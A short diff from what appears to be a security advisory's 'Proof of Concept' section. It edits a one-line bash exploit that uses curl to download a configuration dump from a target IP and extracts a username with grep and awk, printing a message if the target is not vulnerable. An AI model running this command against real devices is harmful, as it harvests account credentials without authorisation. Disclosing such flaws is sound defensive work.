@@ -178,7 +178,7 @@ Proof of Concept
 `````````````````
 Online Bash exploit-p0c:
 curl -s -O http://xxx.xxx.xxx.xxx/configfile.dump && grep "users0"
-configfile.dump|awk '{ FS="."; } { print $4; }' || echo -e "[-] The target
+configfile.dump|awk '{ FS="."; } { print $4; }' || echo "[-] The target
 seems not be vulnerable, Mr. Robot! \n"
 
 IF target (xxx.xxx.xxx.xxx) is vulnerable the exploit will show a username,
